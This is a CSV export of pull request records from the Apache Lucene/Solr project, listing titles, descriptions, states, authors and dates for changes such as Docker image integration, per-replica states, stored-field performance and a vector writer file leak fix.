"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2206","BlobDirectoryFactory correctly deletes directories in the blob store","… and reuses BlobStore and BlobPusher.","open","","bruno-roustant","2021-01-15T09:47:59Z","2021-01-15T14:01:21Z"
"","1854","SOLR-14417: Gradle build sometimes fails RE BlockPoolSlice","Workaround. This is test-change only, shouldn't affect anything else.","closed","","dweiss","2020-09-10T14:19:42Z","2020-09-10T20:25:34Z"
"","1872","LUCENE-9510: Don't pull a merge instance when flushing stored fields out-of-order.","With recent changes to stored fields that split blocks into several sub blocks, the merge instance has become much slower at random access since it would decompress all sub blocks when accessing a document. Since stored fields likely get accessed in random order at flush time when index sorting is enabled, it's better not to use the merge instance.  On a synthetic benchmark that has one stored field and one numeric doc-value field that is used for sorting and fed with random values, this made indexing more than 4x faster.","closed","","jpountz","2020-09-14T15:17:59Z","2020-09-14T16:07:09Z"
"","1823","SOLR-14510: Remove deprecations added with BlockMax WAND support","With BMW support, we added a new method to Text response writers to include in the response if the numFound is exact or not. This PR is to remove the previously existing and deprecated methods and makes the new method abstract to force it's implementation in subclasses. This is intended for master branch only.","closed","","tflobbe","2020-09-03T01:01:20Z","2020-09-10T17:33:15Z"
"","1769","SOLR-14789: Absorb the docker-solr repo.","WIP - https://issues.apache.org/jira/browse/SOLR-14789  **This is intended for 9.0 only, and will not be backported to 8.x.**   We can continue using the docker-solr repo for all 8.x.y releases.  ### Goals  The goal of this PR is to move all functionality for how current solr images are built to lucene solr. However there are clearly a lot of other things we want to accomplish too:  - Migrate functionality from the `solr/docker/include/scripts` into `solr/bin` or Solr itself - Support the ""official"" docker releases (https://hub.docker.com/_/solr not just https://hub.docker.com/apache/solr) - Make the solr docker file more ""cloud native""  Since this docker image will not be officially used until 9.0 at the earliest, this gives us time to iterate and accomplish all of these goals. However merging in this initial functionality that works like the current docker-solr setup first lets us more easily make and test these changes.  ### Setup of `/solr/docker`  `gradle assemble` will now create a docker image that has been created with contents of `:solr:packaging`.  The ""Solr image"" is broken up into 2 docker files.  1. The `package` dockerfile, which contains the solr release under `/opt/solr-build/solr-${VERSION}`. This image requires no other content at the end. 2. The `runtime` dockerfile, which is given the `package` image name as an input and generates everything currently setup in the Solr docker image, copying the package contents from the `package` image.  The `runtime` docker image is the one that will be pushed to Dockerhub eventually, and is run by users.  The idea is that there is also a task to generate the release docker image (which can be found under `/solr/docker/package/Dockerfile.release-package`) that is then passed to the runtime docker image. But this is a future goal and not necessary in order to merge this PR IMO.  I basically learned gradle to write this, so please give any advice on how I could make the build process better. I'm sure it is not optimal.  ### Testing  Once you run `gradle assemble`, you can test the new docker image in two ways:  - `gradle :solr:docker:test`, which will run the docker-solr integration tests using the newly assembled solr image. This will eventually fail when it reaches the test that needs root permissions however, since gradle doesn't have root permissions itself. This is a TODO. - `docker run -d -p 8983:8983 -e SOLR_JETTY_HOST=""0.0.0.0"" apache/solr:9.0.0-SNAPSHOT`, then visit the admin screen at http://localhost:8983 .   TODO: - [ ] Add ability to build with ""release"" package - [ ] Remove ability to push the `package` image. - [ ] Integrate `gradle :solr:docker:tests` into the overall `gradle tests` - [x] Make all of the tests work with gradle.","closed","","HoustonPutman","2020-08-20T21:54:32Z","2020-11-21T17:43:25Z"
"","1720","SOLR-14712 Standardize remote calls in Solr (only API)","WIP , for discussion [SOLR-14712](https://issues.apache.org/jira/browse/SOLR-14712)","open","clean-api,","noblepaul","2020-08-06T07:48:34Z","2020-08-11T09:46:52Z"
"","1813","SOLR-14613: No new APIs. use the existing APIs","WIP , do not commit. Untested  We are spending too much time to create and manage a new set of APIs instead of solving the real problem at hand  What does this PR do  - No new interfaces. Uses the existing interface - Supports configuring `assign-strategy` in `clusterprops.json` .  - Supports packages","closed","autoscaling,","noblepaul","2020-09-01T01:20:04Z","2020-09-09T23:56:39Z"
"","2318","SOLR-15138:  PerReplicaStates does not scale to large collections as well as state.json","WIP","closed","","noblepaul","2021-02-08T00:51:11Z","2021-07-22T04:38:34Z"
"","2177","SOLR-15052: Per-replica states for reducing overseer bottlenecks (trunk)","WIP","closed","","noblepaul","2021-01-05T12:46:01Z","2021-07-22T04:38:41Z"
"","1922","SOLR-14899: Make caches load from packages","WIP","closed","packages,","noblepaul","2020-09-26T13:32:53Z","2020-11-02T23:57:16Z"
"","1746","Fix syntax warning in smokeTestRelease.py","while verifying the 8.6.1 release with the latest python(3.8.5), observed one SyntaxWarning. https://adamj.eu/tech/2020/01/21/why-does-python-3-8-syntaxwarning-for-is-literal/","closed","","munendrasn","2020-08-12T16:20:42Z","2020-08-13T15:46:13Z"
"","2331","LUCENE-9322:  Lucene90VectorWriter can leak open files","While trying to add a test class for Vectors based on `BaseIndexFileFormatTestCase`, a bug surface on the Lucene90VectorWriter constructor. If there is an exception during construction, it might happen that files are not properly closed and therefore it might leak.  Here is the proposal, move the current `TestVectorValues` to a `BaseVectorFormatTestCase` which extends `BaseIndexFileFormatTestCase`.  Fix the constructor so it handle closing files on error properly.","closed","","iverase","2021-02-09T08:57:06Z","2021-02-11T07:40:29Z"
"","2264","Require Thread Names in Solr","When we are creating a new thread we should give it a name. This doesn't apply to Runnable or Callable objects that we pass to an executor, since those should be getting named by the executor itself.  Also, enforce forbidden APIs on the code. I didn't apply the rule to tests because there's so many of them and I think there is less value in the constraint.  This is especially helpful when doing profiling, otherwise we end up with a bunch of Thread-# that are hard to tell apart and search on.","closed","","madrob","2021-01-28T19:32:18Z","2021-01-28T21:04:18Z"
"","2535","LUCENE-10039: Fix single-field scoring for CombinedFieldQuery","When there's only one field, CombinedFieldQuery will ignore its weight while scoring. This makes the scoring inconsistent, since the field weight is supposed to multiply its term frequency.  This PR removes the optimizations around single-field scoring to make sure the weight is always taken into account. These optimizations are not critical since it should be uncommon to use CombinedFieldQuery with only one field.  This backport also incorporates the part of LUCENE-9823 that applies to CombinedFieldQuery. We no longer rewrite single-field queries, which can also change their scoring.","closed","","jtibshirani","2021-07-28T14:26:49Z","2021-07-28T14:28:05Z"
